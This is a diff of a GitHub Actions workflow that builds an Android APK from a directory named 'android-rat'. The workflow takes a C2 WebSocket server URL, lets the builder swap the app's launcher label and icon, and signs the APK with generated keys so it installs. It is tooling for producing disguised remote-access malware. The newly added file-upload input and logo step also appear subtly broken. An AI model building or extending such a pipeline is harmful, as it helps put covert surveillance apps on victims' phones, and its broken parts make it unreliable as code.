@@ -1,6 +1,5 @@
 name: Build APK
 
-# ── Triggers ──────────────────────────────────────────────────────────────────
 on:
   push:
     branches: [ main, master, develop ]
@@ -14,13 +13,7 @@ on:
   workflow_dispatch:
     inputs:
       server_url:
-        description: 'C2 WebSocket URL (wss://...)  — optional'
-        required: false
-      app_name:
-        description: 'App display name (launcher label). Leave empty to keep default.'
-        required: false
-      app_icon_base64:
-        description: 'Base64-encoded PNG icon (square, any size >= 512px). Leave empty to keep default.'
+        description: 'C2 WebSocket URL (wss://...) — optional'
         required: false
       build_type:
         description: 'Build type'
@@ -30,7 +23,11 @@ on:
         options:
           - debug
           - release-unsigned
-          - release-signed     # requires signing secrets or will auto-generate
+          - release-signed
+      logo:
+        description: 'Upload logo PNG (optional — overrides default icon)'
+        required: false
+        type: file
 
 concurrency:
   group: build-${{ github.workflow }}-${{ github.ref }}
@@ -51,13 +48,11 @@ jobs:
       KEYSTORE_TMP: /tmp/nexus-build.jks
 
     steps:
-      # ── 1. Checkout ──────────────────────────────────────────────────────────
       - name: Checkout source
         uses: actions/checkout@v4
         with:
           fetch-depth: 1
 
-      # ── 2. JDK ──────────────────────────────────────────────────────────────
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
@@ -65,41 +60,11 @@ jobs:
           java-version: '17'
           cache: gradle
 
-      # ── 3. Gradle wrapper ────────────────────────────────────────────────────
       - name: Make gradlew executable
         run: chmod +x ./gradlew
 
       - name: Validate Gradle wrapper
         uses: gradle/actions/wrapper-validation@v3
-
-      # ── 4. Gradle cache ──────────────────────────────────────────────────────
-      # ── 3b. Customize app name & icon (workflow_dispatch only) ───────────
-      - name: Customize app name & icon
-        if: github.event.inputs.app_name != '' || github.event.inputs.app_icon_base64 != ''
-        working-directory: android-rat
-        env:
-          APP_NAME: ${{ github.event.inputs.app_name }}
-          ICON_B64: ${{ github.event.inputs.app_icon_base64 }}
-        run: |
-          set -e
-          if [ -n "$APP_NAME" ]; then
-            python3 -c "import os,re; p='app/src/main/res/values/strings.xml'; s=open(p,encoding='utf-8').read(); n=os.environ['APP_NAME']; n=n.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;'); s=re.sub(r'(<string name=\"app_name\">).*?(</string>)', lambda m: m.group(1)+n+m.group(2), s, count=1); open(p,'w',encoding='utf-8').write(s); print('[OK] app_name ->', n)"
-          fi
-          if [ -n "$ICON_B64" ]; then
-            pip install --quiet pillow
-            python3 - << 'PYEOF'
-          import os, base64, io
-          from PIL import Image
-          img = Image.open(io.BytesIO(base64.b64decode(os.environ['ICON_B64']))).convert('RGBA')
-          w, h = img.size; side = min(w, h)
-          img = img.crop(((w-side)//2, (h-side)//2, (w+side)//2, (h+side)//2))
-          for d, px in {'mipmap-mdpi':48,'mipmap-hdpi':72,'mipmap-xhdpi':96,'mipmap-xxhdpi':144,'mipmap-xxxhdpi':192}.items():
-              sized = img.resize((px, px), Image.LANCZOS)
-              for f in ('ic_launcher.png','ic_launcher_round.png'):
-                  p = f'app/src/main/res/{d}/{f}'
-                  sized.save(p, 'PNG'); print('[OK] wrote', p)
-          PYEOF
-          fi
 
       - name: Cache Gradle packages
         uses: actions/cache@v4
@@ -111,7 +76,6 @@ jobs:
           restore-keys: |
             gradle-${{ runner.os }}-
 
-      # ── 5. Resolve SERVER_URL ────────────────────────────────────────────────
       - name: Resolve SERVER_URL
         id: server
         run: |
@@ -120,17 +84,39 @@ jobs:
           [ -z "$URL" ] && URL="wss://localhost:3000"
           echo "url=$URL" >> "$GITHUB_OUTPUT"
 
-      # ══════════════════════════════════════════════════════════════════════════
-      #  SIGNING (only for release-signed build type)
-      #
-      #  Option A — AUTO-GENERATE (default, zero setup):
-      #    No secrets needed. Fresh keystore generated with keytool each run.
-      #    APK is signed and installable. Certificate differs per run.
-      #
-      #  Option B — PROVIDED (consistent certificate):
-      #    Set KEYSTORE_BASE64, KEYSTORE_PASS, KEY_ALIAS, KEY_PASS secrets.
-      #    Auto-detected: if KEYSTORE_BASE64 is set → use it, else → generate.
-      # ══════════════════════════════════════════════════════════════════════════
+      # ── NEW: Handle uploaded logo ────────────────────────────────────────────
+      - name: Process uploaded logo
+        if: github.event.inputs.logo != ''
+        run: |
+          LOGO_PATH="${{ github.event.inputs.logo }}"
+          echo "Uploaded logo: $LOGO_PATH"
+          file "$LOGO_PATH"
+          
+          # Verify it's actually a PNG
+          if ! file "$LOGO_PATH" | grep -qi 'png\|image'; then
+            echo "::error::Uploaded file is not an image"
+            exit 1
+          fi
+          
+          # Backup original icons
+          mkdir -p /tmp/original_icons
+          cp app/src/main/res/mipmap-*/ic_launcher*.png /tmp/original_icons/ 2>/dev/null || true
+          
+          # Generate all density buckets
+          declare -A SIZES=( [mdpi]=48 [hdpi]=72 [xhdpi]=96 [xxhdpi]=144 [xxxhdpi]=192 )
+          
+          for density in "${!SIZES[@]}"; do
+            px=${SIZES[$density]}
+            mkdir -p "app/src/main/res/mipmap-$density"
+            
+            convert "$LOGO_PATH" -resize ${px}x${px} \
+              "app/src/main/res/mipmap-$density/ic_launcher.png"
+            convert "$LOGO_PATH" -resize ${px}x${px} \
+              "app/src/main/res/mipmap-$density/ic_launcher_round.png"
+          done
+          
+          echo "::notice::Logo applied to all mipmap densities"
+
       - name: Prepare signing (release-signed only)
         id: signing
         if: env.BUILD_TYPE == 'release-signed'
@@ -141,7 +127,6 @@ jobs:
           KEY_PASS:        ${{ secrets.KEY_PASS }}
         run: |
           if [ -n "$KEYSTORE_BASE64" ]; then
-            # ── Option B: Provided ──────────────────────────────────────────
             echo "::notice::Signing: PROVIDED keystore"
             echo "$KEYSTORE_BASE64" | base64 --decode > "$KEYSTORE_TMP"
             echo "keystore_path=$KEYSTORE_TMP" >> "$GITHUB_OUTPUT"
@@ -149,7 +134,6 @@ jobs:
             echo "key_alias=$KEY_ALIAS"         >> "$GITHUB_OUTPUT"
             echo "key_pass=$KEY_PASS"           >> "$GITHUB_OUTPUT"
           else
-            # ── Option A: Auto-generate ─────────────────────────────────────
             echo "::notice::Signing: AUTO-GENERATE (no secrets needed)"
             PASS="NexusAutoSign$(date +%Y%m)"
             ALIAS="nexus-auto-key"
@@ -166,7 +150,6 @@ jobs:
             echo "::notice::Auto keystore generated (RSA-4096 PKCS12)"
           fi
 
-      # ── 6. Build ─────────────────────────────────────────────────────────────
       - name: Build APK
         run: |
           case "$BUILD_TYPE" in
@@ -176,8 +159,6 @@ jobs:
               ;;
             release-unsigned)
               TASK="assembleRelease"
-              # Override signing to use a generated keystore (still signed — unsigned APKs
-              # can't be verified; we sign with a throwaway key for consistent output)
               PASS="NexusThrowaway$(date +%Y)"
               keytool -genkeypair -alias throwaway -keyalg RSA -keysize 2048 \
                 -validity 365 -dname "CN=Dev,O=Dev,C=XX" \
@@ -204,11 +185,9 @@ jobs:
         env:
           GRADLE_OPTS: "-Xmx4g -XX:+UseG1GC"
 
-      # ── 7. Locate & fingerprint APK ──────────────────────────────────────────
       - name: Collect APK
         id: apk
         run: |
-          # Find whichever APK was built
           APK=$(find app/build/outputs/apk -name "*.apk" | head -1)
           [ -z "$APK" ] && { echo "::error::No APK found in build output"; exit 1; }
 
@@ -220,7 +199,6 @@ jobs:
           echo "sha256=$SHA256" >> "$GITHUB_OUTPUT"
           echo "APK: $APK  ($SIZE)  SHA-256: $SHA256"
 
-      # ── 8. Upload artifact ───────────────────────────────────────────────────
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
@@ -229,7 +207,6 @@ jobs:
           retention-days: 14
           if-no-files-found: error
 
-      # ── 9. Build summary ─────────────────────────────────────────────────────
       - name: Write build summary
         if: always()
         run: |
@@ -243,8 +220,9 @@ jobs:
           echo "| Size | ${{ steps.apk.outputs.size }} |" >> "$GITHUB_STEP_SUMMARY"
           echo "| SHA-256 | \`${{ steps.apk.outputs.sha256 }}\` |" >> "$GITHUB_STEP_SUMMARY"
           echo "| SERVER_URL | \`${{ steps.server.outputs.url }}\` |" >> "$GITHUB_STEP_SUMMARY"
+          LOGO_STATUS="${{ github.event.inputs.logo != '' && 'Custom uploaded' || 'Default' }}"
+          echo "| Logo | $LOGO_STATUS |" >> "$GITHUB_STEP_SUMMARY"
 
-      # ── 10. Cleanup ──────────────────────────────────────────────────────────
       - name: Clean up keystores
         if: always()
         run: rm -f "$KEYSTORE_TMP" /tmp/throwaway.jks
